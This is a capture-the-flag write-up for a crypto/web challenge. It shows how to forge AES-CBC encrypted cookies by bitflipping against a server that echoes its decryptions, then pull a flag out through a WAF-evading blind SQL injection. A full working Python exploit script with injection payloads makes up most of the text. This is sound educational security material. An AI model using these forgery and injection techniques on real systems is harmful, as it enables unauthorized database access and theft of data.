# cryptolol (crypto/web)

in the task we get access to a webpage which only prints out:


[image extracted text: smelly tooth cromwell
caribbean pirate
secret garden]


there is pretty much nothing else there.
but we get an interesting base64 encoded cookie from the server called `username`.
playing around with this cookie we figure out it's aes-cbc encrypted username.
we can do some bitflipping of the first bytes and it changes corresponding bytes in next 16 byte block.
we also get a full echo on the decryption results from the server.

initially we thought it might simply be padding oracle of some sort, but we easily checked that there is no pkcs padding at all.
we removed iv block, so decryption would show only the second block, and then by bitflipping we deduced that the whole thing is padded with spaces.
we also verified that ciphertext we have contains simply what was printed out - `smelly tooth cromwel`.

short reminder for those who are not familiar with cbc mode: each ciphertext block is decrypted first with aes and then xored with previous block. 
first block is xored with so called iv, which is appended as the first block of ciphertext.
the trick is that we can change iv however we want, and it will result in changing the plaintext after decryption.
if we xor k-th byte of iv with value `x` then k-th byte of first plaintext block will also get xored with `x`.
using this technique we can force any decryption we want for a single block.

by playing around with a single block we noticed that there is some kind of waf on the server, because changing the plaintext contents to words like `union` or `sleep` was giving a special error that the contents were suspicious.

we tried to get some kind of sql injection, but we could get this to work with only one block.
we decided we need more characters in the query.

fortuanately server gave us full decryption results, and this allows us to forge a ciphertext for any plaintext we want.
we can do this by:

1. we send bytes `\x00` in as many blocks as we need for the payload we want to send.
2. we read how server decrypted this.
3. we take last block decryption and xor it with last block of plaintext we want. the result is what the previous block has to be, in order for us to get this result.
4. we set previous block for the xor result value.
5. we send the current ciphertext again, but without the last block.
6. we repeat steps 2-5 for all blocks until last xor becomes the iv.

this way we get a ciphertext which will get decrypted to plaintext we want.

there were some issues with the injection payload here:

1. there was waf which removed some useful instructions
2. it took us a while to figure out the schema and then to notice that for user `smelly tooth cromwel` the `flag` field is null, and we need to find another user with the real flag.
3. we could only get a blind injection, and the query was very particular, because if the result set had more/less than 1 record, it would fail with error, so we used injection in the form of `smelly tooth cromwel' or condition`, and if the condition was true then result set would have more records and there would be error, and otherwise no error would appear.
4. it was pretty slow, even with binary search.
5. substring-like functions were blacklisted so eventually we casted flag to binary and run regex matching on this:

```python
import base64
import re
from ast import literal_eval
from math import ceil
import requests
from bs4 import beautifulsoup
from crypto_commons.generic import chunk, xor_string


def pad(plaintext):
    blocks = int(ceil((float(len(plaintext)) / 16)))
    return plaintext.ljust(blocks * 16, ' ')


def send_payload(payload):
    return requests.get('http://cryptolol.challs.malice.fr', cookies={'username': base64.b64encode(payload)})


def get_error_message(content):
    soup = beautifulsoup(content, 'html.parser')
    message = soup.select_one('.error-message')
    if message:
        if 'suspicious' in message.text:
            raise exception('filter')

        return re.findall('''the user b(["'].*['"]) has been''', message.text)[0]
    elif 'caribbean pirate' in soup.text:
        return true


def form_full_payload(plaintext):
    blocks = len(pad(plaintext)) / 16
    chunks = chunk(pad(plaintext), 16)
    payload = ("\0" * 16) * blocks
    final_blocks = ["\0" * 16]
    for i in range(blocks):
        response = send_payload(payload)
        decrypted = literal_eval(get_error_message(response.content))
        last_block = decrypted[-16:]
        new_block = xor_string(chunks[-i], last_block)
        final_blocks.append(new_block)
        payload = '\x00' * 16 * (blocks - 1) + new_block
    return "".join(final_blocks[::-1])


def convert(x):
    return "\\\\x" + (hex(x)[2:].zfill(2))


def guess_single(prefix, single):
    guess = convert(single)
    text = '''
    smelly tooth cromwel' or flag is not null and (cast(flag as binary) regexp '^.{{{prefix_len}}}{guess}') #
    '''.strip().format(prefix_len=len(prefix), guess=guess)
    payload = form_full_payload(' ' * 16 + text)
    response = send_payload(payload)
    return get_error_message(response.content) is none


def guess_letter(prefix, low, high):
    mid = (low + high) / 2
    if low == high:
        return chr(low)
    if guess_single(prefix, mid):
        return chr(mid)
    print(low, high)
    guess = "[%s-%s]" % (convert(low), convert(mid))
    text = '''
    smelly tooth cromwel' or flag is not null and (cast(flag as binary) regexp '^.{{{prefix_len}}}{guess}') #
    '''.strip().format(prefix_len=len(prefix), guess=guess)
    print(text)
    payload = form_full_payload(' ' * 16 + text)
    response = send_payload(payload)
    if get_error_message(response.content) is none:
        return guess_letter(prefix, low, mid - 1)
    else:
        return guess_letter(prefix, mid + 1, high)

		
def main():
    flag = ""
    while true:
        flag += (guess_letter(flag, 0, 129))
        print("flag progress:", flag)


main()
```

after some (very long...) time we get `ndh{l!st3n-to_me,morty.i_know..that~new$5ituat1ons*can--be__int|midating...}`
